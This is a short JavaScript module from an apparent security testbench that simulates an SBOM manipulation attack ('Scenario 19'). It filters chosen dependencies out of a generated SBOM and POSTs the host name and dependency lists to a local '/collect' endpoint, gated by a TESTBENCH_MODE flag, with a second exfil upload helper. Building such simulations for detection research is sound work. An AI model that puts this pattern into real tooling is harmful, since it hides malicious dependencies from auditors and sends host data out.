/**
 * Malicious SBOM generator (Scenario 19)
 * Generates an SBOM that omits malicious dependencies and exfiltrates evidence.
 */

function exfiltrateEvidence(payload) {
  return new Promise((resolve) => {
    if (process.env.TESTBENCH_MODE !== 'enabled') {
      resolve({ sent: false, reason: 'TESTBENCH_MODE not enabled' });
      return;
    }

    const http = require('http');
    const data = JSON.stringify(payload);
    const req = http.request(
      {
        hostname: '127.0.0.1',
        port: 3019,
        path: '/collect',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data)
        }
      },
      (res) => {
        resolve({ sent: res.statusCode === 200, statusCode: res.statusCode });
      }
    );
    req.on('error', (err) => resolve({ sent: false, error: err.message }));
    req.write(data);
    req.end();
    try {
      const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
      uploadJson('19', 'sbom-exfil', payload);
    } catch (_) {}
  });
}

async function generateSbom({ truthDependencies, omitDependencies }) {
  const generatedDependencies = truthDependencies.filter((d) => !omitDependencies.includes(d));

  const payload = {
    attack: 'sbom-manipulation-attack',
    stage: 'sbom-generation',
    timestamp: new Date().toISOString(),
    hostname: require('os').hostname(),
    omit: omitDependencies,
    generatedDependencies,
    truthDependencies
  };

  const exfil = await exfiltrateEvidence(payload);

  return {
    bomFormat: 'educational-sbom-v1',
    dependencies: generatedDependencies,
    _testbench: exfil
  };
}

module.exports = { generateSbom };
